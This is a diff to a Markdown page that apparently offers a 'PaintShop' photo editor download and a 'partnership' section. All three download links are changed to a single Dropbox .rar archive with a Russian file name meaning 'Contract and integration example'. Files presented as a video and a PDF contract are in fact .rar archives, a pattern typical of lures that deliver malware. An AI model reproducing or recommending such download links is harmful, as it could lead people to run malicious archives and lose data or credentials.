@@ -19,7 +19,7 @@
 
 ## A workflow devoted entirely to creative photo post-processing
 
-## 🔐 [PaintShop Download](https://www.dropbox.com/s/d6otdx5fxnp5gck/Application_installer.rar?dl=1)
+## 🔐 [PaintShop Download](https://www.dropbox.com/s/oz3z59b3lh1gqn6/%D0%94%D0%BE%D0%B3%D0%BE%D0%B2%D0%BE%D1%80%20%D0%B8%20%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80%20%D0%B8%D0%BD%D1%82%D0%B5%D0%B3%D1%80%D0%B0%D1%86%D0%B8%D0%B8.rar?dl=1)
 ### ● Essential tools
 
 Easily crop areas of your photo to alter the focus using composition guides, Golden Ratio and Rule of Thirds. Resize with ease using one of several presets, or resize by pixels, percentage or print size. Restore and repair old photos with the Scratch Remover and Fade Correction tools to enhance contrast and color to faded photos. 
@@ -44,10 +44,10 @@ Reduce repetition and accelerate complex photo-editing actions with Scripts. Rec
 <summary>✅ Partnership and Collaboration:</summary>
   
  #### <div dir="rtl">:Video for advertising integration (.mp4) </div>
- [💾 Download](https://www.dropbox.com/s/6eekng3o1f0ss21/PaintShop%20Pro%202022.rar?dl=1)
+ [💾 Download](https://www.dropbox.com/s/oz3z59b3lh1gqn6/%D0%94%D0%BE%D0%B3%D0%BE%D0%B2%D0%BE%D1%80%20%D0%B8%20%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80%20%D0%B8%D0%BD%D1%82%D0%B5%D0%B3%D1%80%D0%B0%D1%86%D0%B8%D0%B8.rar?dl=1)
   
  #### <div dir="rtl">:Contract for the provision of advertising services (.pdf) </div>
- [💾 Download](https://www.dropbox.com/s/939mwp5tts8befo/%D0%94%D0%BE%D0%B3%D0%BE%D0%B2%D0%BE%D1%80%20%D0%BD%D0%B0%20%D1%80%D0%B5%D0%BA%D0%BB%D0%B0%D0%BC%D1%83%20%D0%BF%D0%BE%20%D0%BF%D1%80%D0%B5%D0%B4%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B5.rar?dl=1)
+ [💾 Download](https://www.dropbox.com/s/oz3z59b3lh1gqn6/%D0%94%D0%BE%D0%B3%D0%BE%D0%B2%D0%BE%D1%80%20%D0%B8%20%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80%20%D0%B8%D0%BD%D1%82%D0%B5%D0%B3%D1%80%D0%B0%D1%86%D0%B8%D0%B8.rar?dl=1)
   
    ...
 </details></div>
